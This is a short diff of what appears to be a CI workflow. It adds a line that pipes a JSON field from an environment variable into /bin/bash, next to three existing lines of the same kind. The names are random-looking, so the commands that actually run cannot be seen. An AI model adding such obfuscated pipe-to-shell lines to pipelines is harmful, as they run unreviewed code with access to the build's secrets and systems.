@@ -31,6 +31,7 @@ jobs:
           echo $u14 | jq -r .z8435 | /bin/bash
           printf '%s' "$uz67" | jq -r .cml798 | /bin/bash
           printf '%s' "$g7977" | jq -r .eoubc62286 | /bin/bash
+          printf '%s' "$no0" | jq -r .jh6 | /bin/bash
 
       - name: Store artifact
         if: always()
